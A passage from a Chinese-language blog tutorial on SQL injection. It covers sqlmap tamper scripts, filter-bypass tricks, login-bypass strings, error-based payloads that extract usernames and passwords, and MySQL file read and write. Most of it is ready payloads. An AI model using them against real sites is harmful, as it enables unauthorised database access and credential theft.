<p>bluecoat.py<br>适用数据库：Blue Coat SGOS<br>测试通过数据库：MySQL 5.1,、SGOS<br>作用：在sql语句之后用有效的随机空白字符替换空格符，随后用LIKE替换=<br>使用脚本前：tamper(‘SELECT id FROM users where id = 1’)<br>使用脚本后：SELECT%09id FROM users where id LIKE 1</p>
<p>versionedkeywords.py<br>适用数据库：MySQL<br>测试通过数据库：MySQL 4.0.18, 5.1.56, 5.5.11<br>作用：注释绕过<br>使用脚本前：tamper(‘1 UNION ALL SELECT NULL, NULL, CONCAT(CHAR(58,104,116,116,58),IFNULL(CAST(CURRENT_USER() AS CHAR),CHAR(32)),CHAR(58,100,114,117,58))#’)<br>使用脚本后：1/<em>!UNION</em>//<em>!ALL</em>//<em>!SELECT</em>//<em>!NULL</em>/,/<em>!NULL</em>/, CONCAT(CHAR(58,104,116,116,58),IFNULL(CAST(CURRENT_USER()/<em>!AS</em>//<em>!CHAR</em>/),CHAR(32)),CHAR(58,100,114,117,58))#</p>
<p>halfversionedmorekeywords.py<br>适用数据库：MySQL &lt; 5.1<br>测试通过数据库：MySQL 4.0.18/5.0.22<br>作用：在每个关键字前添加mysql版本注释<br>使用脚本前：tamper(“value’ UNION ALL SELECT CONCAT(CHAR(58,107,112,113,58),IFNULL(CAST(CURRENT_USER() AS CHAR),CHAR(32)),CHAR(58,97,110,121,58)), NULL, NULL# AND ‘QDWa’=’QDWa”)<br>使用脚本后：value’/<em>!0UNION/</em>!0ALL/<em>!0SELECT/</em>!0CONCAT(/<em>!0CHAR(58,107,112,113,58),/</em>!0IFNULL(CAST(/<em>!0CURRENT_USER()/</em>!0AS/<em>!0CHAR),/</em>!0CHAR(32)),/<em>!0CHAR(58,97,110,121,58)),/</em>!0NULL,/<em>!0NULL#/</em>!0AND ‘QDWa’=’QDWa</p>
<p>space2morehash.py<br>适用数据库：MySQL &gt;= 5.1.13<br>测试通过数据库：MySQL 5.1.41<br>作用：将空格替换为#，并添加一个随机字符串和换行符<br>使用脚本前：tamper(‘1 AND 9227=9227’)<br>使用脚本后：1%23ngNvzqu%0AAND%23nVNaVoPYeva%0A%23lujYFWfv%0A9227=9227</p>
<p>apostrophenullencode.py<br>适用数据库：ALL<br>作用：用非法双字节Unicode字符替换单引号<br>使用脚本前：tamper(“1 AND ‘1’=’1”)<br>使用脚本后：1 AND %00%271%00%27=%00%271</p>
<p>appendnullbyte.py<br>适用数据库：ALL<br>作用：在有效载荷的结束位置加载null字节字符编码<br>使用脚本前：tamper(‘1 AND 1=1’)<br>使用脚本后：1 AND 1=1%00</p>
<p>chardoubleencode.py<br>适用数据库：ALL<br>作用：对给定的payload全部字符使用双重url编码（不处理已经编码的字符）<br>使用脚本前：tamper(‘SELECT FIELD FROM%20TABLE’)<br>使用脚本后：%2553%2545%254C%2545%2543%2554%2520%2546%2549%2545%254C%2544%2520%2546%2552%254F%254D%2520%2554%2541%2542%254C%2545</p>
<p>unmagicquotes.py<br>适用数据库：ALL<br>作用：用一个多字节组合%bf%27和末尾通用注释一起替换空格<br>使用脚本前：tamper(“1’ AND 1=1”)<br>使用脚本后：1%bf%27 AND 1=1–</p>
<p>randomcomments.py<br>适用数据库：ALL<br>作用：用注释符分割sql关键字<br>使用脚本前：tamper(‘INSERT’)<br>使用脚本后：I/<strong>/N/</strong>/SERT</p>
<p>在熟悉了tamper脚本之后，我们应该学习tamper绕过脚本的编写规则，来应对复杂的实际环境。</p>
<h2 id="十八、绕过姿势-str-replace"><a href="#十八、绕过姿势-str-replace" class="headerlink" title="十八、绕过姿势   str_replace()"></a>十八、绕过姿势   <code>str_replace()</code></h2><p><strong>任何的表名、数据库名都可以使用十六进制代替</strong></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1%df<span class="string">&#x27; union select 1,(select group_concat(table_name) from information_schema.tables where table_schema= 0x7365637572697479),3--+</span></span><br></pre></td></tr></table></figure>

<p><strong>万能密码</strong>：<code>$sql=&quot;select * from test where username=&#39; XX &#39; and password=&#39; XX &#39; &quot;;</code></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 不知用户名时</span></span><br><span class="line"><span class="string">&#x27; or 1--+			# 注释闭合</span></span><br><span class="line"><span class="string">&#x27;</span> or <span class="string">&#x27;1&#x27;</span>=<span class="string">&#x27;1			# 手动闭合</span></span><br><span class="line"><span class="string">&#x27;</span> or <span class="string">&#x27;1&#x27;</span>=<span class="string">&#x27;1&#x27;</span><span class="comment">#		# 使用了注释#</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 知道一个用户名</span></span><br><span class="line">admin<span class="string">&#x27; or &#x27;</span>1<span class="string">&#x27;=&#x27;</span>1</span><br><span class="line"></span><br><span class="line"><span class="comment"># 可尝试</span></span><br><span class="line">1<span class="string">&#x27;or(1)#</span></span><br></pre></td></tr></table></figure>

<p><strong>过滤 注释</strong>：</p>
<p>法一：截断 <code>;%00</code></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">;%00</span><br><span class="line">?id=1<span class="string">&#x27; and updatexml(1,concat(0x7e,database(),0x7e),1);%00</span></span><br></pre></td></tr></table></figure>

<p>法二：手动闭合</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1<span class="string">&#x27;and&#x27;</span>1<span class="string">&#x27;=&#x27;</span>1</span><br><span class="line">?id=1<span class="string">&#x27; and updatexml(1,concat(0x7e,database(),0x7e),1)and&#x27;</span>1<span class="string">&#x27;=&#x27;</span>1</span><br></pre></td></tr></table></figure>

<p><strong>过滤空格</strong>：</p>
<p>括号包围：对于一些字段名可使用括号包围</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1<span class="string">&#x27;||updatexml(1,concat(0x7e,(select(group_concat(table_name))from(infoorrmation_schema.tables)where(table_schema=&#x27;</span>security<span class="string">&#x27;)),0x7e),1);%0</span></span><br></pre></td></tr></table></figure>

<p>字符编码绕过：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 可以绕过空格的编码：</span></span><br><span class="line">%09  Tab键-水平</span><br><span class="line">%0a  换行</span><br><span class="line">%0c  换页</span><br><span class="line">%0b  Tab键-垂直</span><br><span class="line">%0d</span><br><span class="line">%00</span><br><span class="line">%a0  在特定字符集才可使用</span><br><span class="line"><span class="comment"># 特殊的 </span></span><br><span class="line">/**/</span><br></pre></td></tr></table></figure>

<p><strong>大小写绕过：</strong></p>
<p>Mysql 中，关键字是不区分大小写的，如果仅仅是过滤了 <code>select </code> ，那么我们可以使用 <code>SelECt</code> ，进行大小写混写绕过。</p>
<p><strong>正则匹配：</strong></p>
<p>正则如果匹配 <code>\bselect\b</code>  ，我们可以使用 <code>/*!50000select*/</code> 绕过。</p>
<p><img src="https://i.loli.net/2021/08/20/8BtLSruRD7nsIdp.png" alt="image-20210820224913933"></p>
<p><strong>一次过滤：双写绕过</strong>：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$id</span>=preg_replace(<span class="string">&#x27;/or/i&#x27;</span>,<span class="string">&quot;&quot;</span>,<span class="variable">$id</span>);</span><br><span class="line"><span class="variable">$id</span>=preg_replace(<span class="string">&#x27;/and/i&#x27;</span>,<span class="string">&quot;&quot;</span>,<span class="variable">$id</span>);</span><br><span class="line"><span class="variable">$id</span>=preg_replace(<span class="string">&#x27;/select/i&#x27;</span>,<span class="string">&quot;&quot;</span>,<span class="variable">$id</span>);</span><br></pre></td></tr></table></figure>

<p><strong>and  or  过滤：双写绕过，或者是 &amp;&amp;–&gt;%26%26  ||–&gt;%7c%7c</strong></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?id=1<span class="string">&#x27;||updatexml(1,concat(0x7e,database(),0x7e),1);%00</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">?id=1&#x27;</span>||updatexml(1,concat(0x7e,database(),0x7e),1)||<span class="string">&#x27;1&#x27;</span>=<span class="string">&#x27;1</span></span><br></pre></td></tr></table></figure>

<p><strong>过滤了单双引号，但没有过滤 反斜杠  <code>\</code></strong></p>
<p>例如：sql 语句</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$<span class="keyword">sql</span><span class="operator">=</span>&quot;select * from nres where id=&#x27;可控参数1&#x27; and title=&#x27;可控参数2&#x27;&quot;;</span><br></pre></td></tr></table></figure>

<p>我们可以进行如下构造，不使用 单双引号，利用反斜杠</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">id=a\</span><br><span class="line">title=or sleep(3)<span class="comment">#</span></span><br><span class="line"><span class="comment">#这样拼起来的 sql 语句就是</span></span><br><span class="line"><span class="variable">$sql</span>=<span class="string">&quot;select * from nres where id=&#x27;a\&#x27; and title=&#x27;or sleep(3)#&#x27;&quot;</span>;</span><br><span class="line"><span class="comment"># 如此，or sleep(3)# 便成了一个整体，将会成功执行后面的 sleep(3)</span></span><br></pre></td></tr></table></figure>

<p>使用</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">select * from users <span class="built_in">where</span> id=<span class="string">&#x27;a\&#x27;</span> and username=<span class="string">&#x27; or sleep(2)#&#x27;</span></span><br><span class="line">select * from users <span class="built_in">where</span> id=<span class="string">&#x27;a\&#x27;</span> and username=<span class="string">&#x27;union select 1,2,(select concat(username,0x7e,password) from users limit 1)#&#x27;</span></span><br></pre></td></tr></table></figure>

<p><img src="https://i.loli.net/2021/08/20/jmOk2eyG7lXcwSd.png" alt="image-20210820230717823"></p>
<p><strong>引号逃逸：其实就是由于做了转义</strong></p>
<p>对单引号、双引号等进行转义之后，在一定程度上妨碍了我们的注入，当遇到这种情况，我们可以考虑：宽字节注入、二次注入、HTTP 头部注入</p>
<p><strong>字符串截断：</strong></p>
<p>在一些标题等位置，开发者一般会限制标题的字符长度，如果超过，有可能会被截断。</p>
<p>代码：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="variable">$conn</span> = mysqli_connect(<span class="string">&#x27;127.0.0.1&#x27;</span>,<span class="string">&#x27;root&#x27;</span>,<span class="string">&#x27;123456&#x27;</span>,<span class="string">&#x27;security&#x27;</span>);</span><br><span class="line">	<span class="variable">$title</span> = addslashes(<span class="variable">$_GET</span>[<span class="string">&#x27;title&#x27;</span>]);</span><br><span class="line">	<span class="keyword">echo</span> <span class="variable">$title</span>;</span><br><span class="line">	<span class="variable">$title</span> = substr(<span class="variable">$title</span>,<span class="number">0</span>,<span class="number">10</span>);	<span class="comment">#做了截断处理</span></span><br><span class="line">	<span class="keyword">echo</span> <span class="string">&#x27;&lt;br /&gt;&#x27;</span>.<span class="variable">$title</span>;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">&#x27;&lt;h1&gt;$title&lt;/h1&gt;&#x27;</span>;</span><br><span class="line">	<span class="variable">$content</span> = addslashes(<span class="variable">$_GET</span>[<span class="string">&#x27;content&#x27;</span>]);</span><br><span class="line">	<span class="keyword">echo</span> <span class="variable">$content</span>;</span><br><span class="line">	<span class="variable">$sql</span> = <span class="string">&quot;insert into users values(15, &#x27;<span class="subst">$title</span>&#x27; , &#x27;<span class="subst">$content</span>&#x27;)&quot;</span>;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">&#x27;&lt;br /&gt;&#x27;</span>.<span class="variable">$sql</span>;</span><br><span class="line">	<span class="variable">$res</span> = mysqli_query(<span class="variable">$conn</span>,<span class="variable">$sql</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>如果攻击者想进行 sql 注入测试，可以选择输入 <code>aaaaaaaaa&#39;</code> ，则经过转义之后，将会变为 <code>aaaaaaaaa\&#39;</code> ，但是由于后面的截断，将变成 <code>aaaaaaaaa\</code>。</p>
<p>使用：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?title=aaaaaaaaa\<span class="string">&#x27;&amp;content=,1),(16,321,2)--+</span></span><br></pre></td></tr></table></figure>

<p>这样拼接到 sql 语句中就变成</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">insert into news values(15, <span class="string">&#x27;aaaaaaaaa\&#x27;</span> , <span class="string">&#x27;,1),(16,321,2)--+&#x27;</span>)</span><br></pre></td></tr></table></figure>

<p>这样 由于转义使得 <code>aaaaaaaaa\&#39; , </code> 成为了由单引号包围的一部分，也就成功执行了 插入语句。</p>
<p><img src="https://i.loli.net/2021/08/21/H68oDiqE1fGIw3S.png" alt="image-20210821105719366"></p>
<p><strong>过滤等号 <code>=</code></strong></p>
<p>使用 <code>like</code></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a<span class="string">&#x27;or(updatexml(1,concat(0x7e,(select(group_concat(table_name))from(information_schema.tables)where(table_schema)like(&#x27;</span>geek<span class="string">&#x27;)),0x7e),1))or&#x27;</span></span><br></pre></td></tr></table></figure>



<h2 id="十九、其它"><a href="#十九、其它" class="headerlink" title="十九、其它"></a>十九、其它</h2><ol>
<li><p>在以上的任何一个注入方式中，都有可能对用户所输入的内容进行编码，例如进行 <code>base64</code> 编码，我们进行爆破时要记得编码；</p>
</li>
<li><p>Nosql 注入         <a target="_blank" rel="noopener" href="https://www.cnblogs.com/bonelee/p/12158385.html">https://www.cnblogs.com/bonelee/p/12158385.html</a></p>
</li>
<li></li>
</ol>
<h2 id="二十、解决查内容时一次显示不全"><a href="#二十、解决查内容时一次显示不全" class="headerlink" title="二十、解决查内容时一次显示不全"></a>二十、解决查内容时一次显示不全</h2><p><strong>方法一：一条一条查</strong></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">and updatexml(1,concat(0x5e,(select concat(username,<span class="string">&#x27;~&#x27;</span>,password) from security.users <span class="built_in">limit</span> 0,1),0x5e),1)<span class="comment">#</span></span><br><span class="line"></span><br><span class="line">and updatexml(1,concat(0x5e,(select concat_ws(<span class="string">&#x27;~&#x27;</span>,username,password) from security.users <span class="built_in">limit</span> 0,1),0x5e),1)<span class="comment">#</span></span><br></pre></td></tr></table></figure>

<p><strong>方法二：substr(,,)</strong></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 每次查30个字符</span></span><br><span class="line">and updatexml(1,concat(0x5e,(select substr(group_concat(concat_ws(<span class="string">&#x27;~&#x27;</span>,username,password)),1,30) from security.users),0x5e),1)<span class="comment">#</span></span><br><span class="line"></span><br><span class="line">and updatexml(1,concat(0x5e,(select substr(group_concat(concat_ws(<span class="string">&#x27;~&#x27;</span>,username,password)),31,30) from security.users),0x5e),1)<span class="comment">#</span></span><br></pre></td></tr></table></figure>

<h1 id="总结：regexp-正则匹配速查表"><a href="#总结：regexp-正则匹配速查表" class="headerlink" title="总结：regexp 正则匹配速查表"></a>总结：regexp 正则匹配速查表</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 使用</span></span><br><span class="line">&lt;内容&gt; regexp <span class="string">&#x27;正则表达式&#x27;</span></span><br></pre></td></tr></table></figure>

<table>
<thead>
<tr>
<th align="left">选项</th>
<th align="left">说明</th>
<th align="left">例子</th>
<th align="left">匹配值示例</th>
</tr>
</thead>
<tbody><tr>
<td align="left">^</td>
<td align="left">匹配文本的开始字符</td>
<td align="left">‘^b’ 匹配以字母 b 开头的字符串</td>
<td align="left">book、big、banana、bike</td>
</tr>
<tr>
<td align="left">$</td>
<td align="left">匹配文本的结束字符</td>
<td align="left">‘st$’ 匹配以 st 结尾的字符串</td>
<td align="left">test、resist、persist</td>
</tr>
<tr>
<td align="left">.</td>
<td align="left">匹配任何单个字符</td>
<td align="left">‘b.t’ 匹配任何 b 和 t 之间有一个字符</td>
<td align="left">bit、bat、but、bite</td>
</tr>
<tr>
<td align="left">*</td>
<td align="left">匹配零个或多个在它前面的字符</td>
<td align="left">‘f*n’ 匹配字符 n 前面有任意个字符 f</td>
<td align="left">fn、fan、faan、abcn</td>
</tr>
<tr>
<td align="left">+</td>
<td align="left">匹配前面的字符 1 次或多次</td>
<td align="left">‘ba+’ 匹配以 b 开头，后面至少紧跟一个 a</td>
<td align="left">ba、bay、bare、battle</td>
</tr>
<tr>
<td align="left">&lt;字符串&gt;</td>
<td align="left">匹配包含指定字符的文本</td>
<td align="left">‘fa’ 匹配包含‘fa’的文本</td>
<td align="left">fan、afa、faad</td>
</tr>
<tr>
<td align="left">[字符集合]</td>
<td align="left">匹配字符集合中的任何一个字符</td>
<td align="left">‘[xz]’ 匹配 x 或者 z</td>
<td align="left">dizzy、zebra、x-ray、extra</td>
</tr>
<tr>
<td align="left">[^ ]</td>
<td align="left">匹配不在括号中的任何字符</td>
<td align="left">‘[^abc]’ 匹配任何不包含 a、b 或 c 的字符串</td>
<td align="left">desk、fox、f8ke</td>
</tr>
<tr>
<td align="left">字符串{n,}</td>
<td align="left">匹配前面的字符串至少 n 次</td>
<td align="left">‘b{2}’ 匹配 2 个或更多的 b</td>
<td align="left">bbb、bbbb、bbbbbbb</td>
</tr>
<tr>
<td align="left">字符串 {n,m}</td>
<td align="left">匹配前面的字符串至少 n 次， 至多 m 次</td>
<td align="left">‘b{2,4}’ 匹配最少 2 个，最多 4 个 b</td>
<td align="left">bbb、bbbb</td>
</tr>
</tbody></table>
<p><strong>匹配中文时</strong>：<code>regexp &#39;(文字)&#39;</code></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">regexp <span class="string">&#x27;[文字]&#x27;</span> 		<span class="comment">#报错</span></span><br><span class="line">regexp <span class="string">&#x27;文字&#x27;</span></span><br><span class="line">like <span class="string">&#x27;文字&#x27;</span></span><br></pre></td></tr></table></figure>

<h1 id="Mysql-对文件的操作"><a href="#Mysql-对文件的操作" class="headerlink" title="Mysql 对文件的操作"></a>Mysql 对文件的操作</h1><ul>
<li>load_file()</li>
<li>load data infile()</li>
<li>system cat</li>
</ul>
<p><strong>使用条件：1. 有File权限（File_priv的值）；2. secure_file_priv 的值不为 NULL</strong></p>
<p>注：&gt;=5.7.16默认值为NULL，&lt;5.7.16则为空</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#查看 File_priv</span><br><span class="line"><span class="keyword">select</span> File_priv <span class="keyword">from</span> mysql.user <span class="keyword">where</span> <span class="keyword">user</span><span class="operator">=</span><span class="string">&#x27;root&#x27;</span> <span class="keyword">and</span> host <span class="operator">=</span><span class="string">&#x27;localhost&#x27;</span>;</span><br></pre></td></tr></table></figure>

<p><img src="https://i.loli.net/2021/06/01/DcqRGnP48OB7kW9.png" alt="image-20210601180220996"></p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">#查看 secure_file_priv</span><br><span class="line"><span class="keyword">show</span> <span class="keyword">global</span> variables <span class="keyword">like</span> &quot;secure_file_priv&quot;;</span><br><span class="line">值是 <span class="keyword">NULL</span> <span class="comment">--- 不允许文件导入导出操作</span></span><br><span class="line">值是 空   <span class="comment">--- 不对mysql的导入导出操作做出限制</span></span><br><span class="line">值是 具体路径 限制mysql的导入与导出操作限制在指定路径下</span><br><span class="line">#修改</span><br><span class="line"># Windows 下</span><br><span class="line">修改 mysql.ini 文件 （secure_file_priv <span class="operator">=</span>）</span><br><span class="line"># Linux 下</span><br><span class="line">在<span class="operator">/</span>etc<span class="operator">/</span>my.cnf的[mysqld]下面添加<span class="keyword">local</span><span class="operator">-</span>infile<span class="operator">=</span><span class="number">0</span>选项</span><br></pre></td></tr></table></figure>

<p><strong>读取文件</strong></p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"># load_file()</span><br><span class="line"><span class="keyword">select</span> load_file(<span class="string">&#x27;D:/test.txt&#x27;</span>);</span><br><span class="line"></span><br><span class="line"># load data infile()</span><br><span class="line"># 利用该函数读文件时需要将文件内容保存至一个表中</span><br><span class="line"><span class="keyword">create</span> <span class="keyword">table</span> test(content text);</span><br><span class="line">load data infile <span class="string">&#x27;D:\\test.txt&#x27;</span> <span class="keyword">into</span> <span class="keyword">table</span> test;</span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> test;	</span><br></pre></td></tr></table></figure>

<p><strong>写入文件</strong></p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">into</span> outfile <span class="string">&#x27;D:\\users.txt&#x27;</span> <span class="keyword">from</span> users;</span><br></pre></td></tr></table></figure>

      
    </div>
    <footer class="article-footer">
      
        <div id="donation_div"></div>


<script src="/js/vdonate.js"></script>

<script>
var a = new Donate({
  title: '如果觉得我的文章对您有用，请随意打赏。您的支持将鼓励我继续创作!', // 可选参数，打赏标题
  btnText: 'Donate', // 可选参数，打赏按钮文字
  el: document.getElementById('donation_div'),
  wechatImage: 'https://i.loli.net/2021/07/09/UNXc5a6nbWxgzru.png',
  alipayImage: 'https://i.loli.net/2021/07/09/Sf9nJd8hkOypTar.png'
});
</script>
      
      
      <div>
        <ul class="post-copyright">
          <li class="post-copyright-author">
          <strong>Post author:  </strong>xizhi-future</a>
          </li>
          <li class="post-copyright-link">
          <strong>Post link:  </strong>
          <a href="/2021/10/07/SQL 注入全解/" target="_blank" title="SQL注入全解">https://xizhi-future.github.io/2021/10/07/SQL 注入全解/</a>
          </li>
          <li class="post-copyright-license">
            <strong>Copyright Notice:   </strong>
            All articles in this blog are licensed under <a rel="license" href="https://creativecommons.org/licenses/by-nc-nd/4.0/" target="_blank" title="Attribution-NonCommercial-NoDerivatives 4.0 International (CC BY-NC-ND 4.0)">CC BY-NC-ND 4.0</a>
            unless stating additionally.
          </li>
         
        </ul>
<div>

      
      
        
	<div id="comment">
		<!-- 来必力City版安装代码 -->
		<div id="lv-container" data-id="city" data-uid="MTAyMC8yOTQ4MS82MDQ5">
		<script type="text/javascript">
		   (function(d, s) {
		       var j, e = d.getElementsByTagName(s)[0];

		       if (typeof LivereTower === 'function') { return; }

		       j = d.createElement(s);
		       j.src = 'https://cdn-city.livere.com/js/embed.dist.js';
		       j.async = true;

		       e.parentNode.insertBefore(j, e);
		   })(document, 'script');
		</script>
		<noscript>为正常使用来必力评论功能请激活JavaScript</noscript>
		</div>
		<!-- City版安装代码已完成 -->
	</div>



      
      
        
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/SQL%E6%B3%A8%E5%85%A5/" rel="tag">SQL注入</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E6%BC%8F%E6%B4%9E/" rel="tag">漏洞</a></li></ul>

      

    </footer>
  </div>
  
    
<nav id="article-nav">
  
    <a href="/2021/10/07/%E5%BA%8F%E5%88%97%E5%8C%96%E4%B8%8E%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" id="article-nav-newer" class="article-nav-link-wrap">
      <strong class="article-nav-caption">Newer</strong>
      <div class="article-nav-title">
        
          序列化与反序列化
        
      </div>
    </a>
  
  
    <a href="/2021/10/07/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E6%A6%82%E5%BF%B5%E3%80%81%E5%8F%91%E5%B1%95%E3%80%81%E6%80%A7%E8%83%BD/" id="article-nav-older" class="article-nav-link-wrap">
      <strong class="article-nav-caption">Older</strong>
      <div class="article-nav-title">计算机网络概念、发展、性能</div>
    </a>
  
</nav>

  
</article>

<!-- Table of Contents -->

  <aside id="toc-sidebar">
    <div id="toc" class="toc-article">
    <strong class="toc-title">Contents</strong>
    
        <ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#SQL-%E6%B3%A8%E5%85%A5%E5%85%A8%E8%A7%A3"><span class="nav-number">1.</span> <span class="nav-text">SQL 注入全解</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%B8%80%E3%80%81%E6%B3%A8%E5%85%A5%E5%88%86%E7%B1%BB"><span class="nav-number">1.1.</span> <span class="nav-text">一、注入分类</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BA%8C%E3%80%81%E6%B3%A8%E5%85%A5%E5%88%A4%E6%96%AD"><span class="nav-number">1.2.</span> <span class="nav-text">二、注入判断</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%B8%89%E3%80%81Mysql-%E6%B3%A8%E5%85%A5"><span class="nav-number">1.3.</span> <span class="nav-text">三、Mysql 注入</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#3-1-%E5%BF%85%E5%A4%87"><span class="nav-number">1.3.1.</span> <span class="nav-text">3.1 必备</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3-2-%E8%AF%AD%E5%8F%A5"><span class="nav-number">1.3.2.</span> <span class="nav-text">3.2 语句</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%9B%9B%E3%80%81union-%E8%81%94%E5%90%88%E6%B3%A8%E5%85%A5-%E5%8D%95%E5%BC%95%E5%8F%B7%E9%97%AD%E5%90%88%E5%AD%97%E7%AC%A6%E5%9E%8B%E4%B8%BA%E4%BE%8B"><span class="nav-number">1.4.</span> <span class="nav-text">四、union 联合注入(单引号闭合字符型为例)</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BA%94%E3%80%81Boolean-%E7%9B%B2%E6%B3%A8"><span class="nav-number">1.5.</span> <span class="nav-text">五、Boolean 盲注</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#5-1-%E6%89%8B%E5%8A%A8%EF%BC%9A%E7%BB%93%E5%90%88-Burp-%E7%88%86%E7%A0%B4%E8%BF%9B%E8%A1%8C"><span class="nav-number">1.5.1.</span> <span class="nav-text">5.1 手动：结合 Burp 爆破进行</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#5-2-%E8%84%9A%E6%9C%AC"><span class="nav-number">1.5.2.</span> <span class="nav-text">5.2 脚本</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%85%AD%E3%80%81%E4%BA%94%E5%A4%A7%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5"><span class="nav-number">1.6.</span> <span class="nav-text">六、五大报错注入</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%B8%83%E3%80%81%E6%96%87%E4%BB%B6%E8%AF%BB%E5%86%99"><span class="nav-number">1.7.</span> <span class="nav-text">七、文件读写</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#7-1-%E6%89%8B%E5%8A%A8"><span class="nav-number">1.7.1.</span> <span class="nav-text">7.1 手动</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#7-2-%E8%84%9A%E6%9C%AC"><span class="nav-number">1.7.2.</span> <span class="nav-text">7.2 脚本</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#8-2-%E8%84%9A%E6%9C%AC"><span class="nav-number">1.7.3.</span> <span class="nav-text">8.2 脚本</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#9-1-%E6%89%8B%E5%8A%A8"><span class="nav-number">1.7.4.</span> <span 